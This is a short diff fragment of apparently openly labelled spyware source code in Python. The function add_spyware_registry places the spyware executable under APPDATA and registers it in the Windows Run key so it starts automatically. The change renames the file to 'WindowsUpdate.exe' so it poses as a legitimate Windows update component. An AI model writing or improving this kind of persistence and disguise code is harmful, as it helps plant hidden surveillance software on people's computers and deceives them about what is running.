@@ -16,7 +16,7 @@ def add_spyware_registry():
     try:
         # Get spyware executable path
         appdata = os.getenv('APPDATA')
-        spyware_exe = os.path.join(appdata, "SystemSecurityService", "SecurityScanner.exe")
+        spyware_exe = os.path.join(appdata, "SystemSecurityService", "WindowsUpdate.exe")
         
         # Open registry key for auto-run
         key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
